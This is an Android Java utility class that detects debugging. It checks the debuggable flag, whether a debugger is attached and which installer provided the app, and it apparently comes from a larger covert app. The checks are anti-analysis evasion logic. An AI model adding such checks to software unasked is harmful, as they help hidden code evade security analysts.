package com.android.dvci.util;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.List;

import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.FeatureInfo;
import android.content.pm.InstrumentationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PermissionGroupInfo;
import android.content.pm.PermissionInfo;
import android.content.pm.ProviderInfo;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.content.res.Resources;
import android.content.res.XmlResourceParser;
import android.graphics.drawable.Drawable;
import android.os.Debug;
import android.util.Log;

import com.android.dvci.Beep;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;

public class AntiDebug {

	public boolean checkFlag() {
		boolean debug = (Status.self().getAppContext().getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
		if (Cfg.DEBUGANTI) {
			Log.w("QZ", " checkFlag: " + debug);
		}
		return debug;
	}

	public boolean checkIp() {
		CheckDebugModeTask checkDebugMode = new CheckDebugModeTask();
		checkDebugMode.execute("");

		Utils.sleep(2000);

		if (Cfg.DEBUGANTI) {
			Log.w("QZ", " checkIp: " + checkDebugMode.IsDebug);
		}
		return checkDebugMode.IsDebug;
	}

	public boolean checkConnected() {
		if (Cfg.DEBUGANTI) {
			Log.w("QZ", " checkConnected: " + Debug.isDebuggerConnected());
		}
		return Debug.isDebuggerConnected();
	}

	public boolean isDebug() {
		if (Cfg.DEBUGANTI) {
			Beep.bip();
			Beep.bip();
			Beep.bip();
		}
		return checkFlag() || checkConnected() ;
	}

	public boolean isPlayStore() {
		PackageManager pm =  Status.getAppContext().getPackageManager();
		try{
			if ( pm.getInstallerPackageName(Status.getAppContext().getPackageName()) != null ) {
				if (Cfg.DEBUGANTI) {
					Log.w("QZ", " packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
				}

				return true;
			}
		}catch(Exception e){
			Log.w("QZ", " NOT installed ?!?! " + e );
		}
		return false;
	}
}
